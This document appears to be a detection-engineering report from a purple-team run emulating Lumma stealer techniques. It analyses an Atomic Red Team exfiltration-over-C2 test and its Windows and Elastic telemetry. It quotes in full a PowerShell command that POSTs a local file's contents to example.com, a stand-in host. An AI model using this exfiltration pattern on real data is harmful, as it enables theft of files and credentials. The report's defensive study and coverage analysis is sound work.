# T1041 — Exfiltration Over C2 Channel

**Atomic test:** #1 — C2 Data Exfiltration
**GUID:** `d1253f6e-c29b-49dc-b466-2147a6191932`
**Magpie chain position:** 11 of 11 · **Tactic:** Exfiltration

> **MITRE technique** ("Exfiltration Over C2 Channel") vs. **atomic test** ("C2 Data Exfiltration") —
> a powershell script generates a synthetic payload (`LineNumbers.txt`) and POSTs it to a remote host
> via `Invoke-WebRequest`. Note up front: this atomic exfils its **own dummy data** to a placeholder
> domain (`example.com`) — it does **not** send node 10's `data.zip` or node 08's browser loot (§5).

---

## 1. What fired (ground truth)

From [`../magpie-run1.csv`](../magpie-run1.csv):

| Execution Time (UTC) | Execution Time (Local) | Technique | Test | ProcessId | ExitCode |
|----------------------|------------------------|-----------|------|-----------|----------|
| 2026-08-14T18:16:09Z | 2026-08-14 20:16:09 | T1041 | #1 C2 Data Exfiltration | 12564 | 0 |

The script creates `$env:TEMP\LineNumbers.txt` (100 lines of "This is line N.") if absent, reads it,
and `Invoke-WebRequest -Method POST`s the content to `example.com`. Exit code 0 = the script
completed. The CSV `ProcessId` (12564) is the exfil powershell.

---

## 2. Endpoint evidence (Windows raw log)

**Security log — Event 4688 (process creation):**
- **Logged (local):** 20:16:09
- **New process:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (New Process ID `0x3114` = **12564** = CSV ProcessId)
- **Process command line:**
  ```
  "powershell.exe" & {if(-not (Test-Path $env:TEMP\LineNumbers.txt)){
    1..100 | ForEach-Object { Add-Content -Path $env:TEMP\LineNumbers.txt -Value "This is line $_." }
  }
  [System.Net.ServicePointManager]::Expect100Continue = $false
  $filecontent = Get-Content -Path $env:TEMP\LineNumbers.txt
  Invoke-WebRequest -Uri example.com -Method POST -Body $filecontent -DisableKeepAlive}
  ```
- **Creator / parent process:** `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe` (Creator Process ID `0x143c` = 5180 — the atomic executor shell)
- **Token Elevation Type:** `%%1937` · **Mandatory Label:** High Mandatory Level
- **Screenshot:** `01-security-4688.png`

**Identity cross-check:** CSV `ProcessId 12564` = 4688 `New Process ID 0x3114` = Kibana
`process.entity_id x7MfudOw3yhzbix/s9YSpQ`.

---

## 3. SIEM evidence (Elastic / Kibana)

**Discover — `event.module: "endpoint"`**
- **`powershell.exe`** (exfil script) @ 20:16:09.804 — the full POST-to-example.com command line;
  entity `x7MfudOw3yhzbix/s9YSpQ`; parent.entity_id `7/uSmidEJs8WDF8jpbJyvg` (executor shell → driver
  root).
- **`conhost.exe`** @ 20:16:09.878 — entity `WzkFclJX75Pq11kkTYR+2w`; parent = the exfil powershell — console host, benign.
- **Screenshots:** `02-kibana-discover.png`, `03-kibana-filepath.png`

**Payload staging (`file.path`):** a `file` write to
`C:\Users\pb-victim\AppData\Local\Temp\LineNumbers.txt` at 20:16:10.356 by entity `x7MfudOw3yhz` —
the synthetic payload being generated (`$env:TEMP` = `…\AppData\Local\Temp`).

**Siblings (shared parent = executor shell `DF8jpbJyvg`):** `hostname.exe` @ 20:16:09.314 and
`whoami.exe` @ 20:16:09.373 — the standard scaffolding pair.

**System noise:** `backgroundTaskHost.exe` file activity under `…\AppData\Local\Packages\Mic…`
@ ~20:16:07 — benign UWP/system activity, unattributed to this technique.

**Not captured here — the network event.** These screenshots contain the process, command line, and
the payload file-write, but no `event.category: network` (or `dns`) document showing the POST itself.
The command line gives the *target* (`example.com`, POST); the network event would give the confirmed
connection and destination — see §5 for the one pivot that captures it.

**Security → Alerts:** no alert — no custom rule authored yet; behavioural protection suite is
licence-gated (telemetry + malware NGAV only).

---

## 4. Timeline reconciliation (+2h)

| Surface | Timestamp | Zone |
|---------|-----------|------|
| CSV (UTC) | 18:16:09Z | UTC |
| CSV (Local) / Windows 4688 | 20:16:09 | CEST (UTC+2) |
| Kibana process (stored) | 18:16:09.804Z | UTC |
| Kibana payload write (stored) | 18:16:10.356Z | UTC |
| Kibana Discover (displayed) | 20:16:09–11 | CEST (browser-local) |

Windows/local and Elastic/UTC differ by +2h — reconciled.

---

## 5. Finding — synthetic exfil to a placeholder host, and what the chain does (and does not) prove

**It exfils dummy data, not the loot.** The payload is `LineNumbers.txt` — 100 lines of
"This is line N." that the atomic generates itself — POSTed to `example.com` (IANA's reserved
documentation domain, a benign stand-in; the bare `-Uri example.com` is prepended `http://` by Windows
PowerShell 5.1). It is **not** node 10's `data.zip` nor node 08's browser output. As a TTP observable,
the exfil pattern is fully present — `Invoke-WebRequest -Method POST` of local file content to a remote
host; success is indicated by exit 0, with the network event as the outstanding confirmation.

**The one pivot left to close it.** The network destination is the field this whole run has been
building toward. To capture it: filter `event.module: "endpoint" and event.category: (network or
dns)` on entity `x7MfudOw3yhz`, then add `destination.domain` / `destination.ip` / `destination.port`.
That gives the confirmed C2 endpoint. The node is not blocked (the target is in the command line), but
the network event is what proves the bytes left the host.

**Whole-chain observation — atomics are independent, the data did not flow end-to-end.** Across the 11
nodes, each atomic is a self-contained technique demonstration, not a wired-together campaign: node 08
collected browser credentials, node 10 archived documents, node 11 POSTs a fresh dummy file. They
share the kill-chain *story* but not the actual *data*. A real Lumma infection would exfiltrate the
genuinely stolen loot; this run demonstrates each TTP's telemetry in isolation. The accurate,
defensible framing is therefore: *the discrete TTPs Lumma uses were emulated and each one's telemetry
correlated* — not *stolen credentials were exfiltrated end-to-end*.

---

## 6. Verdict

- **Fired** (4688 present): **yes** — powershell generated `LineNumbers.txt` and issued
  `Invoke-WebRequest -Method POST` to `example.com` at 20:16:09, PID 12564. Exit 0 (completed);
  network connection confirmable via the `event.category: network` pivot (§5).
- **Defender AV detected** (1116): **no** — verified by exhaustion: the full run holds exactly two
  1116/1117 pairs (nodes 02 · ClickFix.DJS!MTB and 05 · Commandrob.A!ml); the run's last 1116 is node
  05 @ 20:11:49.
- **Defender AV acted** (1117): **no**
- **Custom rule needed:** **yes — net-new coverage (sole coverage).** The POST-based exfil passed
  undetected.

**One-line summary:** C2 exfiltration — a powershell generated a synthetic `LineNumbers.txt` and
`Invoke-WebRequest -Method POST`ed it to `example.com`; the payload staging (file write) and the exfil
command/target are captured, exit 0. It sends dummy data to a placeholder domain, not the run's
collected loot (§5); the confirmed network destination is one `event.category: network` pivot away.
**No Defender AV detection.**
